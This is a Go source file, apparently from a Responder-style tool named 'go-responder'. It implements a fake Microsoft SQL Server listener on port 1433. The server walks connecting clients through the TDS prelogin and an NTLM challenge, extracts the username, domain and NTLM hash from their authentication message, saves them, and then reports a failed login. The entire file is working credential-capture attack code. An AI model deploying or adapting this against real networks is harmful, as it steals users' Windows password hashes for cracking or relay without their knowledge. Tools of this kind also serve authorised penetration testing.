package server

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"go-responder/internal/core"
)

const (
	tdsSQLBatch    = 0x01
	tdsLogin7      = 0x10
	tdsPrelogin    = 0x12
	tdsSSPI        = 0x11
	tdsTabularResp = 0x04
)

func ServeMSSQL(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:1433", ifaceIP))
	if err != nil {
		core.LogError("MSSQL listen :1433 - %v (need root?)", err)
		return
	}
	core.LogInfo("MSSQL listening on %s:1433", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleMSSQL(c)
	}
}

func HandleMSSQL(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := core.GetChallenge()

	for {
		hdr := make([]byte, 8)
		if _, err := io.ReadFull(c, hdr); err != nil {
			return
		}
		pktType := hdr[0]
		pktLen := int(binary.BigEndian.Uint16(hdr[2:4]))
		if pktLen < 8 || pktLen > 1<<20 {
			return
		}
		body := make([]byte, pktLen-8)
		if _, err := io.ReadFull(c, body); err != nil {
			return
		}

		switch pktType {
		case tdsPrelogin:
			resp := buildTDSPreloginResp()
			c.Write(wrapTDS(tdsTabularResp, resp))

		case tdsLogin7:
			ntlm := core.FindNTLMSSP(body)
			if ntlm != nil && len(ntlm) >= 12 && core.NTLMMsgType(ntlm) == 1 {
				core.LogVerbose("MSSQL NTLM Type1 (LOGIN7) from %s", c.RemoteAddr())
				ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
				c.Write(wrapTDS(tdsSSPI, ntlmChallenge))
			} else {
				c.Write(buildTDSError("Login failed for user."))
				return
			}

		case tdsSSPI:
			ntlm := core.FindNTLMSSP(body)
			if len(ntlm) < 12 {
				return
			}
			switch core.NTLMMsgType(ntlm) {
			case 1:
				core.LogVerbose("MSSQL NTLM Type1 (SSPI) from %s", c.RemoteAddr())
				ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
				c.Write(wrapTDS(tdsSSPI, ntlmChallenge))

			case 3:
				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
				if err == nil {
					core.SaveCapture("MSSQL", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
				}
				c.Write(buildTDSError("Login failed for user."))
				return
			}
		}
	}
}

func wrapTDS(pktType byte, data []byte) []byte {
	pktLen := 8 + len(data)
	hdr := []byte{
		pktType,
		0x01,
		byte(pktLen >> 8), byte(pktLen),
		0x00, 0x00,
		0x01,
		0x00,
	}
	return append(hdr, data...)
}

func buildTDSPreloginResp() []byte {
	encryptOffset := uint16(6)
	encryptLen := uint16(1)
	return []byte{
		0x01,
		byte(encryptOffset >> 8), byte(encryptOffset),
		byte(encryptLen >> 8), byte(encryptLen),
		0xFF,
		0x02,
	}
}

func buildTDSError(msg string) []byte {
	msgUTF16 := make([]byte, len(msg)*2)
	for i, ch := range msg {
		binary.LittleEndian.PutUint16(msgUTF16[i*2:], uint16(ch))
	}
	var tok []byte
	tok = append(tok, 0xAA)
	length := uint16(4 + 1 + 1 + 2 + len(msgUTF16) + 1 + 1 + 1 + 2 + 2)
	tok = append(tok, byte(length), byte(length>>8))
	tok = append(tok, 0xE7, 0x13, 0x00, 0x00)
	tok = append(tok, 0x01)
	tok = append(tok, 0x0e)
	tok = append(tok, byte(len(msg)), byte(len(msg)>>8))
	tok = append(tok, msgUTF16...)
	tok = append(tok, 0x01)
	srvName := core.SessionMachineName
	if len(srvName) == 0 {
		srvName = "S"
	}
	tok = append(tok, byte(srvName[0]))
	tok = append(tok, 0x00)
	tok = append(tok, 0x01, 0x00)

	tok = append(tok,
		0xFD,
		0x02, 0x00,
		0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	)
	return wrapTDS(tdsTabularResp, tok)
}
